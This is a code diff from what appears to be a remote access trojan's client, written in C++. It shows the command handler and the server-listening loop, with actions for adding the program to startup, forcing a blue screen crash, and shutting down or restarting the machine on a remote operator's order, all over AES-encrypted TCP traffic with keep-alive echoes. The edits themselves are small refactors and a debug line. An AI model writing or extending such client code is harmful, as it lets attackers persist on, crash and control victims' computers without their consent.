@@ -205,7 +205,7 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
 
     BOOL    success     = FALSE;
     CMDDESC description = CreateCommandDescription(command);
-    std::string cmdOutput;
+    std::string cmdOutput = "";
 
     switch ( command.action ) {
     case Action::kAddToStartup:
@@ -219,6 +219,7 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         this->m_ProcMgr.BSOD();
         break;
     case Action::kRemoteShutdown: {
+        CLIENT_DBG(command.buffer);
         if ( strcmp(command.buffer, "shutdown") == 0 )
             ProcessManager::ShutdownSystem(ShutdownPowerOff);
         else if ( strcmp(command.buffer, "restart") == 0 )
@@ -267,11 +268,7 @@ void Client::ListenForServerCommands() {
 
     while ( true ) {
         BYTESTRING encrypted;
-        received = m_NetworkManager.ReceiveTCPLargeData(
-            encrypted,
-            this->m_TCPSocket,
-            TCP
-        );
+        received = m_NetworkManager.ReceiveTCPLargeData(encrypted, this->m_TCPSocket);
 
         if ( !received ) {
             if ( this->m_TCPSocket == INVALID_SOCKET )
@@ -284,7 +281,7 @@ void Client::ListenForServerCommands() {
         
         if ( receivedPacket.action == kKeepAlive ) {
             BYTESTRING cipherPacket = LGCrypto::EncryptStruct(toEcho, this->m_AESKey, LGCrypto::GenerateAESIV());
-            m_NetworkManager.SendTCPLargeData(cipherPacket, this->m_TCPSocket, TCP);
+            m_NetworkManager.SendTCPLargeData(cipherPacket, this->m_TCPSocket);
             continue;
         } else if ( receivedPacket.action == kKillClient ) {
             this->Disconnect();
@@ -300,7 +297,7 @@ void Client::ListenForServerCommands() {
             continue;
 
         BYTESTRING buffer = LGCrypto::EncryptStruct(responseToServer, this->m_AESKey, LGCrypto::GenerateAESIV());
-        m_NetworkManager.SendTCPLargeData(buffer, this->m_TCPSocket, TCP);
+        m_NetworkManager.SendTCPLargeData(buffer, this->m_TCPSocket);
     }
 }
 
@@ -397,7 +394,7 @@ bool Client::SendMessageToServer(Server& dest, Packet message) {
         return m_NetworkManager.TransmitData(message, this->m_TCPSocket, TCP);
     else if ( dest.type == SOCK_DGRAM )
         return m_NetworkManager.TransmitData(message, this->m_UDPSocket, UDP, dest.addr);
-
+        
     return false;
 }
 
